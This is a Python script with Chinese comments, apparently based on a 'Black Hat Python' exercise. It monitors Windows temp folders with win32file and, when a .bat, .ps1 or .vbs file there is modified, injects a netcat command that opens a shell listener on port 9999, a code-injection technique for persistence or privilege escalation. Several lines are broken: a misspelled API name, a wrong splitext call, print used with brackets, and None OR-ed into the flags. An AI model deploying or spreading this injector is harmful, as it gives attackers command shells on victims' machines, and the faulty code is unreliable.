import os
import tempfile
import threading
import win32con
import win32file

FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

FILE_LIST_DIRECTORY = 0x0001

NETCAT = 'C:\\users\\seris\\work\\netcat.exe'
TGT_IP = '192.168.56.101'
CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c'

# 紀錄各個文件後綴名對應的腳本代碼片段
FILE_TYPES = {
    '.bat': ["\r\nREM bhpmarker\r\n", f'\r\n{CMD}\r\n'],
    '.ps1': ["\r\n#bhpmarker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
    '.vbs': ["\r\nbhpmarker\r\n", f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n'],
}

# 設定要監控的文件夾
PATHS = ['c:\\Windows\\Temp', tempfile.gettempdir()]

def inject_code(full_filename, contents, extension):
    if FILE_TYPES[extension][0].strip() in contents:
        return
    
    # 在文件中寫入標記和運行的代碼
    full_contents = FILE_TYPES[extension][0]
    full_contents += FILE_TYPES[extension][1]
    full_contents += contents

    with open(full_filename, 'w') as f:
        f.write(full_contents)
    
    print('\\o/ Injected Code')

def monitor(path_to_watch):
    # 創建 handle 來監視一個目錄的變化
    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,  # 操作目錄而非文件
        None
    )

    while True:
        try:
            # 在目錄變動時，提供通知
            results = win32file.ReadDirectoryCahngesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY |
                win32con.FILE_NOTIFY_CHANGE_SIZE |
                None,
                None,
            )
            # 監控所有文件，並輸出被修改的文件名或改動的具體類型
            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)

                if action == FILE_CREATED:
                    print(f'[+] Created {full_filename}')
                elif action == FILE_DELETED:
                    print(f'[-] Deleted {full_filename}')
                elif action == FILE_MODIFIED:
                    print(f'[*] Modified {full_filename}')
                    extension = os.path.splitext(full_filename[1])
                    # 如果存在後綴名，注入代碼
                    if extension in FILE_TYPES:
                        try:
                            with open(full_filename) as f:
                                contents = f.read()
                                print('[vvv] Dumping contents')
                                inject_code(full_filename, contents, extension)
                                print['[^^^] Dump compete.']
                        except Exception as e:
                                print(f'[!!!] Dump failed. {e}')

                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from {full_filename}')
                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to {full_filename}')
                else:
                    print(f'[?] UnKnown action on {full_filename}')
        except KeyboardInterrupt:
            break
        
        except Exception:
            pass

if __name__ == '__main__':
    for path in PATHS:
        monitor_thread = threading.Thread(target=monitor, args=(path,))
        monitor_thread.start()

